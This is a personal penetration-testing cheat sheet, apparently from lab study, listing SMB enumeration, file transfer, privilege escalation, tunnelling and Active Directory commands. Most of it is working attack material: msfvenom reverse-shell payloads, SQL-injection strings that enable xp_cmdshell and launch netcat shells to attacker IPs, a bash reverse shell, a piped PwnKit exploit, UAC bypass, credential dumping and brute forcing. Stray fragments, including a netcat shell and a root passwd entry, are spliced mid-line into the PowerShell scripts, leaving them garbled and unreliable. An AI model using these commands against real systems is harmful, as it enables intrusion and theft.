The **Command Dump** is a dedicated file where I continuously collect and document various commands, techniques, and observations related to penetration testing. This resource serves as my personal study note, capturing new commands and methods I encounter during my learning and practical exercises. It is regularly updated with fresh insights and techniques that I've found useful, making it a valuable tool for quick reference and ongoing skill development.

```
Get-ChildItem -Path C:\ -Filter "fILENAME" -Recurse -ErrorAction SilentlyContinue - WINDOWS COMMAND TO FIND A FILE IN ENTIRE SYSTEM
windows command for search a file with its extentions:
Get-ChildItem -Path C:\Users -Include *.txt, *.log, *.kdbx, *.conf, *.ini, *.exe, *.ps1 -File -Recurse -ErrorAction SilentlyContinue
#### Linux 
Search the entire OS 
find / -type f -name "flag.txt" 2>/dev/null

To check hidden files in windows directory:
gci -force

To convert a binary to .exe or to any format using Go:
first navigate to source file and then run the below command change the names and format accordingly
GOOS=windows GOARCH=amd64 go build -o chisel.exe -ldflags "-s -w"

Linux to linux using scp:
scp /home/emiller/development/grade-app.apk root@192.168.45.229:/root/   \\tanfer a file from remote to local
scp -P 43022 dademola@192.168.189.125:/home/git/.ssh/id_rsa .  \\can copy a file from taget linux to our local
scp -o StrictHostKeyChecking=no -r elliot@192.168.195.124:/home/elliot/.mozilla/firefox/esmhp32w.default-default/cert9.db /root/Desktop/Tools/firefox_decrypt/  chnage path, user and filename accordingly

SUing NC:
nc -lvp 1234 > grade-app.apk    \\this has to bu run from the reciver machine
nc kali_ip 1234 < /home/emiller/development/grade-app.apk   \\this has to be executed on sender machine, change ip and path to file and file name accordingly


#### Windows
Search the entire OS
dir /R  \\find hidden file
more < hm.txt:root.txt   \\extrat content from the hiddenfile, chnage file nmae accordingly
dir /s /b C:\flag.txt
dir /S C:\Path\To\Directory\*.kdbx *.log *.ini *.txt *.conf, *.exe, *.ps1, *.bak

swaks -t TO EMAIL --from FROM EMAIL -au USERNAME -ap PASSWORD --attach @./FILE_TO_ATTACH --server *TARGET_IP*--body --header "Subject: Problems" - COMMAND TO SEND AN EMAIL WITH ATTACHEMNT (11.3.1 Q3)

SMB enum:
smbclient -L 10.10.10.74      \\Anonymous login
smbclient //192.168.232.248/transfer -N 
smbclient  \\\\Target_ip\\\\USERNAME OR SHARENAME: COMMAND TO GET SMB CMD ACESS
smbclient -L //$target --option="client min protocol=core" -U ''
smbclient -U '' -L \\\\192.168.189.55\\\\   \\to see shares, without password
smbclient \\\\192.168.189.55\\shenzi\\    \\play with back slashes to get cmd
smbclient -N //192.168.200.105/commander -p 36445  \\get cmd with port number 
smbclient -N //192.168.189.172/DocumentsShare  \\get cmd
smbclient //192.168.217.175/Password\ Audit -U V.Ventz%'HotelCalifornia194!'   \\if your share name have space in  between use \
smbclient //172.16.199.21/scripts -U 'FILES//mountuser%DRtajyCwcexfiltrated.offsecbWvH/9'  \\change username, password and share accordingly to get cmd
smbclient -l \\\\192.168.224.10\\: If SMB port open check this command to list sharesSMB
smbmap -u mountuser -p 'DRtajyCwcbWvH/9'  -H 172.16.199.21 -d relia.com
enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" 192.168.159.188
smbclient //192.168.159.188/WebApp -U  CRAFT2/thecybergeek
crackmapexec smb 192.168.189.172 -u guest -p "" --rid-brute   \\if you can't get any info from shares, use this brue force 

gobuster dir -u http://target_ip/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak -s 200,204,301,302,307,403 -k --status-codes ""
gobuster dir -u http://target_ip/ -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301 --no-error -x html,txt -o dir80.txt -r -x .xml,.php,.txt

MULTI Handler for windows/meterpreter/reverse_tcp:

1. Open a terminal and start Metasploit by running msfconsole.

2. At the msfconsole prompt, use the use command to select the multi/handler module:
use exploit/multi/handler

3. Set the payload to match the one you used to generate the payload:
set PAYLOAD windows/meterpreter/reverse_tcp

4. Set the required options such as LHOST (your IP address) and LPORT (the port you want to listen on):
set LHOST 192.168.45.156
set LPORT 4444

5. Finally, type exploit or run to start the listener:
EXPLOIT

END

meterpreter > search -f FILENMAE: Command to search a file in meterpreter
connecting metsploit to psql database:
sudo msfdb init
sudo systemctl enable postgresql

TRANSFER FILE FROM linux TO Windows:
on your kali, Run python3 -m http.server 80 on a directory where the file to transfer is located

on the windows, run on powershell wget -Uri http://you_kali_ip/anything.exe -Outfile C:\Windows\Temp\anything.exe

TRANSFER FILE FROM WINDOWS TO LINUX: Evil-winrm
download C:\windows.old\Windows\System32\SAM /home/kali/SAM  \\change path accordingly

on your kali: impacket-smbserver test . -smb2support -username root -password R0ot
on your target window machine, run: net use m: \\10.10.14.10\test /user:root R0ot

then run: copy x_file.txt m:\

Alternate Smb Share to trnafer a file:
impacket-smbserver kali .   \\Run this in our kali machineon the directory where the file you wanna transfer
copy \\10.10.14.2\kali\MS11-062.exe   \\run this from target machine to donload the file, change filename, ip accordingly

Another Method to tarnfer a file: 
RDP mounting shared folder Using xfreerdp:
On Kali:
xfreerdp /cert-ignore /compression /auto-reconnect /u:USERNAME /p:PASSWORD/v:192.168.212.250 /w:1600 /h:800 /drive:test,/path/to/save/file

MSFVENOM meterpreter REverseShell Listener command:
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST Kali_IP;set LPORT 4444;run;"

MSF console REVERSESHELL EXEcutables:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=9999 -f dll -o FileName.dll
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.176 LPORT=4444 -f exe > FileName.exe

Windows cmd to download a file from linux or prom other webstites)
powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://example.com/file.txt', 'C:\path\to\save\file.txt')"

HYDRA FOR BRUTEFORCE AND PASSWORD SPRAYING:
hydra -l USER_NAME -P rockyou.txt -s ssh_PORT ssh://target_IP 
hydra -L UNAME_FILE OR UNAME_LIST/FILE/PATH -p "PASSWORD" rdp://Target_IP  PASSWORD SPRAYING
hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt TARGET_IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:LOGIN FAILED INDICATOR"     DICTINORY ATTACK ON HTTP LOGIN POOST_FORMS
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://Target_ip     HTTP_GET ATTACK IN Hydra

HashCAT
hashcat -m 13400 FILE.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force  HASHCAT COMMAND TO CRACK KEEPASS MASTERS PASSWORD
hash mode identifier:
hashcat --help | grep -i "HASH_TYPE"    This COMMAND IS USE TO GET THE HASHCAT METHOD ID OF A HASH

xp_cmdshell:
Step 1:
make sure to enable xp_cmdshell by:

';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--

Step 3: check with command:
';EXEC xp_cmdshell 'whoami'--

step 2: Upload payload
';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.XX.XX/nc64.exe c:/windows/temp/nc64.exe";--
Note:
run python3 -m http.server 80 to check the status of downloading progress, don't forget to run the command the directoryu where the nc64.exe file resides

step 3:
';EXEC xp_cmdshell "c:/windows/temp/nc64.exe 192.168.XX.XX 443 -e cmd.exe";--

RUNAS command for windows powershell
runas /user:USER_NAME cmd

TO GET COMMAND LINE HISTORY IN WINDOWS POWERSHELL:
(Get-PSReadlineOption).HistorySavePath
schtasks /query /fo LIST /v
EVIL-WINRM TO ESTABLISH REMOTE CONNECTION: if port winrm open or other remote command execution port opened
evil-winrm -i 192.168.50.220 -u USER_NAME -p "PASSWORD\!\!"

TO START A SERVER in Local Host:
python3 -m http.server 80

Download a file from kali local host to remote host:
iwr -uri http://Kali_ip/path_to_file -Outfile filename
certutil -urlcache -split -f "http://192.168.45.223/met.exe" met.exe  \\cahnge ip , file name accordingly
iex(new-object net.webclient).downloadstring('http://10.10.14.10/Sherlock.ps1')
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10/rev.bat', 'C:\windows\temp\rev.bat')


xp_cmdshell:
Step 1:
make sure to enable xp_cmdshell by:

';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--

Step 3: check with command:
';EXEC xp_cmdshell 'whoami'-sekurlsa::logonpasswords-
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://192.168.45.242/nc.exe -OutFile C:\Windows\Temp\nc.exe"; C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.242 4444';--  \\to gt reverse shell

step 2: Upload payload
';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.XX.XX/nc64.exe c:/windows/temp/nc64.exe";--
Note:
run python3 -m http.server 80 to check the status of downloading progress, don't forget to run the command the directoryu where the nc64.exe file resides

step 3:
';EXEC xp_cmdshell "c:/windows/temp/nc64.exe 192.168.XX.XX 443 -e cmd.exe";--

Windows Enumeration:
whoami /groups
net user steve
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
systeminfo
ipconfig /all
route print
netstat -ano  \\ list all active network connections
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname   \\to list installed applications both 32 and 64 bit
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-Process
runas /user:backupadmin cmd
netstat -ano | findstr LISTENING \\will check listening ports

Windows Privilege escalation:
dir env:  \\check of any key information, like appkey
Information Gold mine:
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

LOOK for registry:
Get-ItemProperty -Path "HKCU:\Software\SimonTatham\PuTTY\Sessions"

To find running services in WINDOWS:binary hijacking
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,State,PathName (TO list all service both running and stopped services)
Use PowerUp.ps1 to see modifialbe serivce files
iwr -uri "http://192.168.45.180/Powerup.ps1" -Outfile power.ps1
Get-ModifiableServiceFile  \\after importing powerup.ps1
Install-ServiceBinary -Name 'mysql'  \\change binary name accordingly

dll hijacking:
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Restart-Service BetaService  \\Change service name accordinglyFind running service and restart it 
$env:path   \\Display the PATH environment variable
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll   \create a dll file in c language and covet to .dll
ac7da9407b749ac570a3c9639e1f7f4f

unqouted service:
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Start-Service GammaService  \\start and stor service , change service name accordingly
iwr -uri "http://192.168.45.180/Powerup.ps1" -Outfile power.ps1
Get-UnquotedService  \\use after impoprting powerup.ps1

To check the permission of the service in  Windows:
icacls "c:\Path"

To cross compile to .exe: Using LINUX
x86_64-w64-mingw32-gcc File_Name -o FileName.exe

To find vulnerable binary, DLL, unquoted services:
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

To find Schuduled task in windows:
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /C:schedule.ps1  \\change file name to check accordingly

To check oermissions in a directory using ICACLS:
icacls 'C:\directory_Path'

Printspoofer tool For prevescl Windows for SEIMPERSONATE PRIVILAGE ENABLED:
GIT hub Source: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
Execution method:
.\PrintSpoofer64.exe -i -c Malicious_file.exe

Reverse shell CheatSheets links:
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#bash-tcp
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

TO ENABLE SeBackPrivilage:
Download .dll files from: https://github.com/giul192.168.184.72iano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
Commands:
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege

WINDOWS PRIVESCL:
https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---privileged-file-write

Robo Command to copy Directory content without permissions:
robocopy /b C:\Users\Path\To\Directory\ .\NEW Directory_Name

Linux privilege escalation:
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
https://book.hacktricks.xyz/linux-hardening/privilege-escalation

TO search for SUID-marked binaries:
find / -perm -u=s -type f 2>/dev/null
find / -type f -iname borg 2>/dev/null  \\find particular directory, change file or directory name accordingly
find /etc -type f -writable 2> /dev/null  \\it will check which file is writable in the /etc directory

PKEXEC/PWNKIT Vulnerability for Privesc:  \\Check aftet Suid binary search
Automated:
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
Manual Method:
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
chmod +x ./PwnKit
./PwnKit # interactive shell
./PwnKit 'id' # single command


TOOL to automate Linux Privescl:
unix-privesc-check
Command to execute:
./unix-privesc-check standard > output.txt

Tranfer a file from local kali machine to remote windows machine:
nc -nvlp <PortNumber> FileName \\this command 
PS C:\users\public> powershell -Command "Start-Process powershell -Verb RunAs"
powershell -Command "Start-Process powershell -Verb RunAs"
PS C:\users\public> ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
True
PS C:\users\public> 
in remote host
nc -nv <Remote_IP> <PortNumber> < /Path/To/File \\this command in local kali machine
scp Filename UNMAE@Remote_Ip:  \\Using scp to tranfer file

To Creatr Password List: USing Crunch
crunch 6 6 -t pass%% > Output_FileNmae

Impotant file to read in Linux:
env
cat .bashrc 
grep "CRON" /var/log/syslog
cat /etc/issue
uname -r
arch
ls -lah /etc/cron*
cat /etc/iptables/rules.v4
crontab -l
ALWAYS LOOK FOR FILE PERMISSIONS FOR SENSITIVE FILES Like /etc/passwd, /etc/shadow
IF you able to get non interative shell, look for euid is root or not

To listen Service Footprints To detect any anomoly (Password Capture):
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
tcpdump -i ens192 udp -vvv   \\sometime you might get username and password

Bash Script Reverse Shell:
Script:
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc Kali_IP LPORT >/tmp/f

To Create Password hash using openssl:
openssl passwd password
To add root user to /etc/passwd if it is writable
Root_UserName:Password.Hash:0:0:root:/root:/bin/bash

Check For SetUID permissions (Includes -s):
ls -asl Path/To/file

If FIND utility is Misconfigured:
find /Path -exec "/usr/bin/bash" -p \;

To Find binarys with SUID capabilties:
/usr/sbin/getcap -r / 2>/dev/null
Link for Instruction to abuse SetUID capabilities:
https://gtfobins.github.io/

SearchSploit filter search to find Linux Kernal Exploit:
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"   \\Change versions accordingly


PORT Forwardin & Tunneling:

Port_Forwarding using SOCAT:
Step 1: Initial foothold to gain Username and passwords for DMZ
socat -ddd TCP-LISTEN:2345,fork TCP:DMZ_IP:LPORT_OF_DMZ  \\IN Client Machine
psql -h Client_IP -p 2345 -U username  \\In our Local Kali machine WAN
Once connected via Postgress use command like:ss -tulpn
\l to list database
\c name to enter into database particular database

Step 2: Connecting via ssh to DMZ with stolen Unmae and PASS:
socat TCP-LISTEN:2222,fork TCP:DMZ_IP:22   \\In client Machine
ssh UserName@client_ip -p2222   \\IN Kali Machine

TO get a Interactive Shell:sekurlsa::logonpasswords
python -c 'import pty; pty.spawn("/bin/bash")'

Port Redirection and SSH Tunneling:
step1:
python3 -c 'import pty; pty.spawn("/bin/bash")'

Step2:
ssh database_admin@10.4.50.215

Step3:
once connected, l,ook for ip addr and ip route
And if there is no port scanning tool use the following command to do so;
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done    \\command for check 445 port open in subnet of 170.16.50.x/24
change the for loop accordingly to do port scan

Step4:
once the host found with 445 open do an ssh connection:
ssh -N -L 0.0.0.0:4455:172.16.214.217:445 database_admin@10.4.214.215  \\run this on client 1, change varaibles accordingly, like port num,user name, ect.


Step5:
ss -ntplu  \\look for the ssh lestining, that we have initaited via previous command

Step 6:
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234  \\enumarate smb shave from our locakl kali machine
then enumarate share:
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234

DYNAMIC PORT FORWARDING:
Same as Local port forwarding with slight changes:
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215 \\ for dynamic port Forwarding, run in client cmd, if you found vuln port, change that instead 9999
configure /etc/proxychains4.conf
tail /etc/proxychains4.conf  \\command to have a look, edit with nano cmd
remote_ip 9999 \\replace the local host 127.0.0.1 to this 
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234   \\smb enum
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217  \\running nmap fot top 20 ports

Remote Port Forwarding:
sudo systemctl start ssh   \\Start ssh service in your kali machine
python3 -c 'import pty; pty.spawn("/bin/bash")'
Same as Local and dynamic port forwarding with slight changes:
ssh -N -R 127.0.0.1:2345:10.4.214.215:5432 root@192.168.45.215  \\this command is to connect via ssh to our own kali as remote user, if you found vuln port, change accordingly
ss -ntplu \\ check in our kali machine wheather the port 2345 is listening via ssh
psql -h 127.0.0.1 -p 2345 -U username
iwr -uri "http://192.168.45.242/mimikatz.exe" -Outfile mimi.exe
Remote Dynamic Port Forwarding:
sudo systemctl start ssh   \\Start ssh service in your kali machine
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.45.x  \\run in client ip, if found vuln port to enum, then change port num accordingly

Port forwarding Using Shuttle tool: (it's like Vpn)
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22  \\listen on port 2222, this command in client environment
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24  \\ run this in kali machine
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234  \\ to check it is working, try to enumarate smb

Remote Port Forwarding WIndows:/home/anita/.ssh/id_ecdsa
Port Forwading usin ssh.exe:
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64  \\conntect to windows via rdp if you don't have access to windows machine
where ssh  \\to find ssh
ssh.exe -V  \\to check ssh version, it has to above 7.6
ssh -N -R 9998 kali@Kali_Ip  \\run in windows machine to reverse ssh to our kali
tail /etc/proxychains4.conf \\edit accordingly, localhost port
proxychains psql -h 10.4.50.215 -U postgres  \\ its is set up, now we can acess the target through proxychains, in this command we use psql


Port forwarding using plink tool:
sudo systemctl start apache2
find / -name nc.exe 2>/dev/null  \\find nc.exe in our kali, if there is no nc in target 
sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/  \\copy thhe file to apache 2 server /var/www/html directory to download
powershell wget -Uri http://Kali_ip/nc.exe -OutFile C:\Windows\Temp\nc.exe  \\if you have access to webshell on target, execute it there 
C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446  \\execute this to get reverese shell, listen to 4446 port on kali to recive reverse shell
find / -name plink.exe 2>/dev/null  \\find plink in kali
sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/   \\same, copy to html directory
powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe  \\run the command in reversehe we reseved
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 Kali_ip   \\executing plink wto establish remote reverse ssh connection to our kali, here port 3389 is the target's rdp port number
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833   \\now you can ineract with target, for example establishing rdp.

Port Forwarding using NETSH: 
connect to windows machine
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.45.242 connectport=22 connectaddress=172.16.221.11  \\To make a ssh listen to target in dmz, run in windows machine and chane ip address and interface addr accordingly 
netstat -anp TCP | find "2222"  \\can cross check whether it is listening usin this command
netsh interface portproxy show all  \\can also confirm that the port forward is stored by issuing the show all
sudo nmap -sS 192.168.50.64 -Pn -n -p2222  \\run in kali to check whether we can acdcess the dmz target
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow   \\if the port is filtered, add firewall rule in windows machine, run nmap agin from kali to check port is open.
ssh database_admin@192.168.50.64 -p2222  \\connect to dmz target via ssh now, if the port 2222 is open
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"  \\if everthing is done, this command is to delete the rule we created 
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64  \\this command is to stop listeninin to dmz target via ssh 2222 that we have started earlier.

METASPLOIT:
Set Up:
initate database to msf
msfdb init  \\command to initate db connection to metasploit
sudo systemctl enable postgresql  \\command to enable psql db, because msf use psql db
sudo msfconsole  \iwr -uri "http://192.168.45.180/mimikatz.exe" -Outfile mimi.exe\then run msfconsole to open metesploit
db_status  \\command to view our database status
workspace -a Workspace_Name \\command to create a workspace 
db_nmap -A 192.168.50.202  \\run nmap in metesploit -A debnotes aggresive scan
hosts  \\command to display identified host, 
services  \\command to list identified services from hosts
services -p port number  \\command to list service on particular host on all idetified hosts

Jump into Auxiliary module:
show auxiliary \\command to show auxlilary modules
search type:auxiliary smb  \\command to filter search, in the case we searching auxiliary with smb

MSFVENOM:
msfvenom -l payloads | grep php  \\to find specific payload for a exploit
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.45.228 LPORT=443 -f raw -o shell.pHP  \\command to generate payload for meterpreter PHP reverse tcp, change accordingly for other payloads to generate
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe  \\comand for reverse tcp for windows as .exe file
msfvenom -p php/reverse_php LHOST=192.168.45.180 LPORT=4444 -f raw > shell.php
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.240 LPORT=443 -f dll -o tzres.dll
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.240 LPORT=443 -f dll -o tzres.dll
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2/rev.ps1')" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode  \\this will generate a shell code for revershell

Metepreter Post Exploitations commands:
getsystem  \\command to elevate privilage as NT AUthority if the client have impersonate priviliage enabled
ps \\command to list running service
migrate pid \\command ot elevate privilage by migarting command, change pid accodingly. enter pid of service which is runned by a user you want to change to.
shell  \\command to get interacticve command shell
help  \\to display all availabe commands

To check intgrity level of process currently running:xp_cmdshell:
Step 1:
make sure to enable xp_cmdshell by:

';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--

Step 3: check with command:
';EXEC xp_cmdshell 'whoami'--

step 2: Upload payload
';EXEC xp_cmdshell "certutil -urlcache -f http://10.10.14.2/nc64.exe c:/windows/temp/nc64.exe";--
Note:
run python3 -m http.server 80 to check the status of downloading progress, don't forget to run the command the directoryu where the nc64.exe file resides

step 3:
';EXEC xp_cmdshell "c:/windows/temp/nc64.exe 192.168.XX.XX 443 -e cmd.exe";--
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel  \\check the inetgrity of process

To change inetgrity level to high:
come back to muli/handler and enter command: search UAC
use exploit/windows/local/bypassuac_sdclt  \\exploit to do so
set SESSION 9  \\set with your session number
set LHOST 192.168.119.4 \\set lisetining host and run

To get NTLM/LM hases:
getsystem \\elevate privilage as NT authority
load kiwi  \\tool to do so
help \\use this command to undersatand the tool192.168.184.72
creds_msv \\after loading kiwi use this command to get NTLM/LM hases
 
ACTIVE DIRECTORY (AD):
command gather domain and its user info:
net user /domain   
net user jeffadmin /domain
net group /domain
net group "Sales Department" /domain
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota' \\this will check how many computers we can add to domain if we have add workstation privilege enabled.

Powershell script 1 for basic AD enum: LDAP Path Construction Script, to get LDAP path
# Retrieve the name of the Primary Domain Controller (PDC) for the current domain.
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name

# Retrieve the Distinguished Name (DN) of the current domain.
$DN = ([adsi]'').distinguishedName 

# Construct an LDAP path using the PDC name and DN.
$LDAP = "LDAP://$PDC/$DN"

# Output the constructed LDAP path.
$LDAP

Powershell Script 2 for AD enum: Function for LDAP Query Searrosh:$1$.4sKjiNW$jABh29lNCDNamGQ8Qbuq..:0:0:root:/root:/bin/bashch in command line
Step 1: save this below code in .ps1 format
# Define a function named LDAPSearch with a single parameter named $LDAPQuery
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    # Retrieve the Primary Domain Controller (PDC) of the current domain and store its name in $PDC
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    
    # Retrieve the distinguished name of the current directory and store it in $DistinguishedName
    $DistinguishedName = ([adsi]'').distinguishedName

    # Create a new DirectoryEntry object representing the LDAP path constructed using the PDC and distinguished name
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    # Create a new DirectorySearcher object using the DirectoryEntInvoke-BloodHound -CollectionMethod Allry object and the provided LDAP query
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    # Perform the LDAP search using the iwr -uri "http://192.168.45.160/lin-agent.exe" -Outfile agent.exeDirectorySearcher object and return the results
    return $DirectorySearcher.FindAll()

}
$(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
Step 2: import the powershell script 

Import-Module .\function.ps1   \\change the script .ps1 name accordingly
LDAPSearch -LDAPQuery "(samAccountType=805306368)"  \\Performing a user search using the new function, if you know user name change it to (name:username)
LDAPSearch -LDAPQuery "(objectclass=group)"   \\Searching all possible groups in AD

foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {
>> $group.properties | select {$_.cn}, {$_.member}
>> }  \\Using "foreach" to iterate through the objects in $group variable

$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department*))"  \\Adding the search to our variable called $sales
$sales.properties.member    \\Printing the member attribute on the Sales Department group object
rosh:$1$.4sKjiNW$jABh29lNCDNamGQ8Qbuq..:0:0:root:/root:/bin/bash
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Dev./print.exe -i -c powershellelopment Department))"  
$group.properties.member   \\ Printing the member attribute on the Development Department group object

$user = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=michelle*))"
$user.Properties  \\ to listiwr -uri "http://192.168.45.180:8000/lin-agent.exe" -Outfile  agent.exe properties of particular user

Using PowerView To0l to enumaration:
command to execute: refer this link https://powersploit.readthedocs.io/en/latest/Recon/
Commands To Enum:
Get-NetDomain  \\Obtaining domain information
Get-NetUser  \\Querying users in the domain
Get-NetUser | select cn  \\Querying users using select statement
Get-NetUser | select cn,pwdlastset,lastlogon  \\ Querying users displaying attributes( pwdlastset and lastlogo) 
Get-DomainUser | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_ -replace '^CN=(.*?),.*$', '$1' }  \\get cn of all users
Get-NetGroup | select cn  \\ Querying groups in the domainInvoke-BloodHound -CollectionMethod All
Get-NetGroup "Sales Department" | select member  \\Enumerating the "Sales Department" group, change group name accordingle to enum groups
Get-NetGroupMember "Domain Admins"  \\This command will retrieve the members of the "Domain Admins" group, change group name accordingly
Get-NetUser "fred"  \\This command will retrive group that fred member of, change user name accordingly
Get-NetComputer   \\Partial domain computer overview
Get-NetComputer | select operatingsystem,dnshostname    \\filter OS and hostname
Find-LocalAdminAccess  \\Scanning domain to find local administrative privileges for our user
Get-NetSession -ComputerName files04 \\Checking logged on users with Get-NetSession, change host name accordingly
